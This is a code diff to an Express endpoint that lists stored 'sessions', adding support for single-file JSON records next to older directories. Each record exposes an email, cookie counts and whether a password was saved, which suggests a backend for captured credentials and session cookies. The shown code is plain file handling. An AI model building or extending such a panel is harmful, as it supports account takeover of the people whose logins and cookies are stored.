@@ -819,12 +819,32 @@ app.get('/api/sessions', (req, res) => {
             const sessions = [];
             const items = fs.readdirSync(sessionDir);
             
-            // Look for individual session directories
+            // Look for session files (new single-file format) and directories (old format)
             for (const item of items) {
                 const itemPath = path.join(sessionDir, item);
                 
-                if (fs.lstatSync(itemPath).isDirectory() && item.startsWith('session_')) {
-                    // Check for session metadata file
+                if (fs.lstatSync(itemPath).isFile() && item.startsWith('session_') && item.endsWith('.json')) {
+                    // New single-file format
+                    try {
+                        const sessionData = JSON.parse(fs.readFileSync(itemPath, 'utf8'));
+                        const stats = fs.statSync(itemPath);
+                        
+                        sessions.push({
+                            email: sessionData.email || 'Unknown',
+                            timestamp: sessionData.timestamp,
+                            cookieCount: sessionData.cookies ? sessionData.cookies.length : 0,
+                            totalCookies: sessionData.totalCookies,
+                            hasPassword: !!sessionData.password,
+                            id: sessionData.id,
+                            sessionPath: itemPath,
+                            format: 'single-file',
+                            lastModified: stats.mtime
+                        });
+                    } catch (e) {
+                        console.log(`⚠️ Failed to parse session file ${item}: ${e.message}`);
+                    }
+                } else if (fs.lstatSync(itemPath).isDirectory() && item.startsWith('session_')) {
+                    // Old individual files format
                     const metadataFile = path.join(itemPath, 'session_metadata.json');
                     
                     if (fs.existsSync(metadataFile)) {
@@ -845,6 +865,7 @@ app.get('/api/sessions', (req, res) => {
                                 hasPassword: !!metadata.password,
                                 id: metadata.id,
                                 sessionPath: itemPath,
+                                format: 'directory',
                                 lastModified: stats.mtime
                             });
                         } catch (e) {
